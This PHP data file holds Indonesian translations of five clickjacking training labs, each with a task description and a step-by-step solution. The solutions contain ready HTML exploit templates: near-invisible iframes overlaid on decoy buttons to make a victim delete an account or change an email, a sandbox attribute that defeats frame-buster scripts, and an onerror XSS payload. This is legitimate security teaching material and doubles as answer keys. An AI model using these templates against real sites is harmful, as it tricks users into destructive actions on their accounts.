<?php

return [
    'ccfdc81094e272982bb5995e349d1fee4cb10179392ed6b49586fed5837006a0' => [
        'title' => 'Clickjacking dasar dengan proteksi token CSRF',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki fungsionalitas login dan tombol hapus akun yang dilindungi oleh token CSRF. Pengguna akan mengeklik elemen yang menampilkan kata "click" pada situs umpan.
        </p><p>
            Untuk menyelesaikan lab ini, susun HTML yang membingkai halaman akun dan menipu pengguna agar menghapus akunnya sendiri. Lab selesai ketika akun terhapus.
        </p><p>
            Anda dapat masuk ke akun Anda menggunakan kredensial berikut: <code>wiener:peter</code>
        </p><div class="highlightedarea">
            <h4>Catatan</h4>
            <p>
                Korban akan menggunakan Chrome sehingga ujilah eksploit Anda pada browser tersebut.
            </p>
        </div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Masuk ke akun Anda di situs web target.
                    </li>
                    <li>
                        <p>
                            Buka exploit server dan tempelkan template HTML berikut ke bagian <strong>Body</strong>:
                        </p>
                        <code class="code-scrollable">&lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe src=&quot;YOUR-LAB-ID.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt;</code>
                    </li>
                    <li>
                        Lakukan penyesuaian berikut pada template:
                        <ul>
                            <li>
                                Ganti <code>YOUR-LAB-ID</code> pada atribut <code>src</code> iframe dengan ID unik lab Anda.
                            </li>
                            <li>
                                Ganti variabel <code>$height_value</code> dan <code>$width_value</code> pada iframe dengan ukuran piksel yang sesuai (kami sarankan 700px dan 500px).
                            </li>
                            <li>
                                Ganti variabel <code>$top_value</code> dan <code>$side_value</code> untuk konten web umpan agar tombol "Delete account" sejajar dengan teks umpan "Test me" (kami sarankan 300px dan 60px).
                            </li>
                            <li>
                                Atur nilai opasitas <code>$opacity</code> agar iframe target menjadi transparan. Awalnya pakai 0.1 agar Anda mudah menyelaraskan elemen. Untuk serangan akhir, nilai 0.0001 sudah bekerja dengan baik.
                            </li>
                        </ul>
                    </li>
                    <li>
                        Klik <strong>Store</strong> lalu <strong>View exploit</strong>.
                    </li>
                    <li>
                        Arahkan kursor ke atas <strong>Test me</strong> dan pastikan kursor berubah menjadi ikon tangan yang menandakan elemen div sudah tepat posisinya. <strong>Jangan klik tombol "Delete account" itu sendiri secara langsung.</strong> Jika terklik, lab akan rusak dan Anda harus menunggu hingga lab direset untuk mencoba lagi (sekitar 20 menit). Bila div belum sejajar, sesuaikan properti <code>top</code> dan <code>left</code> pada style sheet.
                    </li>
                    <li>
                        Begitu posisi div sudah pas, ubah "Test me" menjadi "Click me" lalu klik <strong>Store</strong>.
                    </li>
                    <li>
                        Klik <strong>Deliver exploit to victim</strong> dan lab akan terselesaikan.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766' => [
        'title' => 'Clickjacking dengan input form terisi otomatis dari parameter URL',
        'descriptionHtml' => <<<'LABHTML'
<p>
           Lab ini memperluas contoh clickjacking dasar pada <a href="/web-security/clickjacking/lab-basic-csrf-protected">Lab: Basic clickjacking with CSRF token protection</a>. Tujuannya adalah mengubah alamat email pengguna dengan mengisi form terlebih dahulu melalui parameter URL dan memancing pengguna mengeklik tombol "Update email".
        </p><p>
            Untuk menyelesaikan lab ini, buat HTML yang membingkai halaman akun dan menipu pengguna agar memperbarui alamat emailnya saat mengeklik umpan "Click me". Lab selesai ketika alamat email berhasil diubah.
        </p><p>
            Anda dapat masuk ke akun Anda menggunakan kredensial berikut: <code>wiener:peter</code>
		</p><div class="highlightedarea">
            <h4>Catatan</h4>
            <p>
                Korban akan menggunakan Chrome sehingga ujilah eksploit Anda pada browser tersebut.
            </p>
        </div><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Anda tidak dapat mendaftarkan alamat email yang sudah dipakai oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji eksploit, pastikan Anda memakai alamat email berbeda untuk eksploit akhir yang dikirim ke korban.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Anda tidak dapat mendaftarkan alamat email yang sudah dipakai oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji eksploit, pastikan Anda memakai alamat email berbeda untuk eksploit akhir yang dikirim ke korban.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Masuk ke akun di situs web target.
                    </li>
                    <li>
                        <p>
                            Buka exploit server dan tempelkan template HTML berikut ke bagian "Body":
                        </p>
                        <code class="code-scrollable">&lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe src=&quot;YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com&quot;&gt;&lt;/iframe&gt;</code>
                    </li>
                    <li>
                        Lakukan penyesuaian berikut pada template:
                        <ul>
                            <li>
                                Ganti <code>YOUR-LAB-ID</code> pada atribut <code>src</code> iframe dengan ID unik lab Anda sehingga URL mengarah ke halaman akun target yang berisi form "Update email".
                            </li>
                            <li>
                                Ganti variabel <code>$height_value</code> dan <code>$width_value</code> dengan nilai piksel yang sesuai (kami sarankan 700px dan 500px).
                            </li>
                            <li>
                                Ganti variabel <code>$top_value</code> dan <code>$side_value</code> pada konten umpan agar tombol "Update email" dan umpan "Test me" sejajar (kami sarankan 400px dan 80px).
                            </li>
                            <li>
                                Atur nilai opasitas <code>$opacity</code> agar iframe transparan. Awalnya pakai 0.1 agar Anda mudah menyelaraskan elemen. Untuk serangan akhir, nilai 0.0001 sudah bekerja.
                            </li>
                        </ul>
                    </li>
                    <li>
                        Klik <strong>Store</strong> lalu <strong>View exploit</strong>.
                    </li>
                    <li>
                        Arahkan kursor ke "Test me" dan pastikan kursor berubah menjadi ikon tangan yang menandakan elemen div tepat posisinya. Jika tidak, sesuaikan properti top dan left di style sheet.
                    </li>
                    <li>
                        Begitu div sejajar, ubah "Test me" menjadi "Click me" lalu klik <strong>Store</strong>.
                    </li>
                    <li>
                        Ubah alamat email di eksploit Anda agar tidak sama dengan email Anda sendiri.
                    </li>
                    <li>
                        Kirim eksploit ke korban untuk menyelesaikan lab.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '71c2bcc46f11be8e063fa976c68b2383fb1dfd04c1be432086d3f030159f15ae' => [
        'title' => 'Clickjacking dengan skrip frame buster',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini dilindungi oleh frame buster yang mencegah situs web dibingkai. Dapatkah Anda melewati frame buster tersebut dan melakukan serangan clickjacking untuk mengubah alamat email pengguna?
        </p><p>
            Untuk menyelesaikan lab ini, buat HTML yang membingkai halaman akun dan menipu pengguna agar mengubah alamat emailnya dengan mengeklik "Click me". Lab selesai ketika alamat email berhasil diubah.
		</p><p>
            Anda dapat masuk ke akun Anda menggunakan kredensial berikut: <code>wiener:peter</code>
        </p><div class="highlightedarea">
            <h4>Catatan</h4>
            <p>
                Korban akan menggunakan Chrome sehingga ujilah eksploit Anda pada browser tersebut.
            </p>
        </div><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Anda tidak dapat mendaftarkan alamat email yang sudah dipakai oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji eksploit, pastikan Anda memakai alamat email berbeda untuk eksploit akhir yang dikirim ke korban.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Anda tidak dapat mendaftarkan alamat email yang sudah dipakai oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji eksploit, pastikan Anda memakai alamat email berbeda untuk eksploit akhir yang dikirim ke korban.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Masuk ke akun di situs web target.
                    </li>
                    <li>
                        <p>
                            Buka exploit server dan tempelkan template HTML berikut ke bagian "Body":
                        </p>
                        <code class="code-scrollable">&lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe sandbox=&quot;allow-forms&quot;
src=&quot;YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com&quot;&gt;&lt;/iframe&gt;</code>
                    </li>
                    <li>
                        Lakukan penyesuaian berikut pada template:
                        <ul>
                            <li>
                                Ganti <code>YOUR-LAB-ID</code> pada atribut <code>src</code> iframe dengan ID unik lab Anda agar mengarah ke halaman akun target yang berisi form "Update email".
                            </li>
                            <li>
                                Ganti variabel $height_value dan $width_value pada iframe dengan nilai piksel yang sesuai (kami sarankan 700px dan 500px).
                            </li>
                            <li>
                                Ganti variabel $top_value dan $side_value untuk konten umpan agar tombol "Update email" dan umpan "Test me" sejajar (kami sarankan 385px dan 80px).
                            </li>
                            <li>
                                Atur nilai opasitas <code>$opacity</code> agar iframe transparan. Awalnya pakai 0.1 agar mudah menyelaraskan elemen. Untuk serangan akhir, nilai 0.0001 sudah bekerja.
                            </li>
                        </ul>
                        Perhatikan pemakaian atribut <code>sandbox="allow-forms"</code> yang menetralkan skrip frame buster.
                    </li>
                    <li>
                        Klik <strong>Store</strong> lalu <strong>View exploit</strong>.
                    </li>
                    <li>
                        Arahkan kursor ke "Test me" dan pastikan kursor berubah menjadi tangan yang menandakan elemen div sejajar. Jika belum, ubah properti top dan left pada style sheet.
                    </li>
                    <li>
                        Begitu div sejajar, ubah "Test me" menjadi "Click me" dan klik <strong>Store</strong>.
                    </li>
                    <li>
                        Ubah alamat email dalam eksploit agar tidak sama dengan email Anda sendiri.
                    </li>
                    <li>
                        Kirim eksploit ke korban untuk menyelesaikan lab.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    'd259e02fbd358d4b88e4de6938c6bcd31a3c35a7ba4fc54fa4352a3822990f24' => [
        'title' => 'Mengeksploitasi kerentanan clickjacking untuk memicu DOM-based XSS',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan XSS yang dipicu oleh sebuah klik. Susun serangan clickjacking yang menipu pengguna agar mengeklik tombol "Click me" sehingga memanggil fungsi <code>print()</code>.
		</p><div class="highlightedarea">
            <h4>Catatan</h4>
            <p>
                Korban akan menggunakan Chrome sehingga ujilah eksploit Anda pada browser tersebut.
            </p>
        </div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
					<li>
						<p>
							Buka exploit server dan tempelkan template HTML berikut ke bagian <strong>Body</strong>:
						</p>
						<code class="code-scrollable">&lt;style&gt;
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe
src=&quot;YOUR-LAB-ID.web-security-academy.net/feedback?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test&#35;feedbackResult&quot;&gt;&lt;/iframe&gt;</code>
					</li>
					<li>
						Lakukan penyesuaian berikut pada template:
						<ul>
							<li>
								Ganti <code>YOUR-LAB-ID</code> pada atribut <code>src</code> iframe dengan ID unik lab Anda agar mengarah ke halaman "Submit feedback" situs target.
							</li>
							<li>
								Ganti variabel $height_value dan $width_value pada iframe dengan nilai piksel yang sesuai (kami sarankan 700px dan 500px).
							</li>
							<li>
								Ganti variabel $top_value dan $side_value untuk konten umpan agar tombol "Submit feedback" dan umpan "Test me" sejajar (kami sarankan 610px dan 80px).
							</li>
							<li>
								Atur nilai opasitas <code>$opacity</code> agar iframe transparan. Awalnya pakai 0.1 untuk penyelarasan, lalu 0.0001 untuk serangan akhir.
							</li>
						</ul>
					</li>
					<li>
						Klik <strong>Store</strong> lalu <strong>View exploit</strong>.
					</li>
					<li>
						Arahkan kursor ke "Test me" dan pastikan kursor berubah menjadi tangan yang menandakan elemen div sudah sejajar. Jika belum, ubah properti top dan left di style sheet.
					</li>
					<li>
						Klik <strong>Test me</strong>. Dialog cetak (print) seharusnya terbuka.
					</li>
					<li>
						Ubah "Test me" menjadi "Click me" dan klik <strong>Store</strong> pada exploit server.
					</li>
					<li>
						Sekarang klik <strong>Deliver exploit to victim</strong> dan lab akan terselesaikan.
					</li>
				</ol>
            </div></div>
LABHTML,
        ],
    ],
    '5b7dc27b9539ec5079973204aadb5f58a9a78906b0a16bf6af46ca0407ada9a2' => [
        'title' => 'Clickjacking multi-langkah (multistep)',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki fungsionalitas akun yang dilindungi token CSRF dan juga dialog konfirmasi untuk mencegah clickjacking. Untuk menyelesaikan lab ini, susun serangan yang menipu pengguna agar mengeklik tombol hapus akun dan dialog konfirmasi lewat umpan "Click me first" dan "Click me next". Anda perlu menggunakan dua elemen untuk lab ini.
        </p><p>
			Anda dapat masuk ke akun Anda menggunakan kredensial berikut: <code>wiener:peter</code>
        </p><div class="highlightedarea">
            <h4>Catatan</h4>
            <p>
                Korban akan menggunakan Chrome sehingga ujilah eksploit Anda pada browser tersebut.
            </p>
        </div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
				<ol>
					<li>
						Masuk ke akun Anda di situs web target dan buka halaman akun pengguna.
					</li>
					<li>
						<p>
							Buka exploit server dan tempelkan template HTML berikut ke bagian "Body":
						</p>
						<code class="code-scrollable">&lt;style&gt;
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
&nbsp; &nbsp;.firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
&nbsp; &nbsp;.secondClick {
		top:$top_value2;
		left:$side_value2;
	}
&lt;/style&gt;
&lt;div class=&quot;firstClick&quot;&gt;Test me first&lt;/div&gt;
&lt;div class=&quot;secondClick&quot;&gt;Test me next&lt;/div&gt;
&lt;iframe src=&quot;YOUR-LAB-ID.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt;</code>
					</li>
					<li>
						Lakukan penyesuaian berikut pada template:
						<ul>
							<li>
								Ganti <code>YOUR-LAB-ID</code> dengan ID unik lab Anda sehingga URL mengarah ke halaman akun pengguna target.
							</li>
							<li>
								Ganti variabel <code>$width_value</code> dan <code>$height_value</code> dengan nilai piksel yang sesuai (kami sarankan 500px dan 700px).
							</li>
							<li>
								Ganti variabel <code>$top_value1</code> dan <code>$side_value1</code> agar tombol "Delete account" dan umpan "Test me first" sejajar (kami sarankan 330px dan 50px).
							</li>
							<li>
								Ganti variabel <code>$top_value2</code> dan <code>$side_value2</code> agar umpan "Test me next" sejajar dengan tombol "Yes" pada halaman konfirmasi (kami sarankan 285px dan 225px).
							</li>
							<li>
								Atur nilai opasitas <code>$opacity</code> agar iframe target transparan. Awalnya pakai 0.1 agar mudah menyelaraskan elemen, lalu 0.0001 untuk serangan akhir.
							</li>
						</ul>
					</li>
					<li>
						Klik <strong>Store</strong> lalu <strong>View exploit</strong>.
					</li>
					<li>
						Arahkan kursor ke "Test me first" dan pastikan kursor berubah menjadi tangan. Jika belum sejajar, ubah properti top dan left di kelas <code>firstClick</code> dalam style sheet.
					</li>
					<li>
						Klik <strong>Test me first</strong> lalu arahkan kursor ke <strong>Test me next</strong> dan pastikan kursor berubah menjadi tangan. Jika belum, ubah properti top dan left di kelas <code>secondClick</code>.
					</li>
					<li>
						Setelah posisi elemen div tepat, ubah "Test me first" menjadi "Click me first", ubah "Test me next" menjadi "Click me next", lalu klik <strong>Store</strong> di exploit server.
					</li>
					<li>
						Sekarang klik <strong>Deliver exploit to victim</strong> dan lab akan terselesaikan.
					</li>
				</ol>
            </div></div>
LABHTML,
        ],
    ],
];
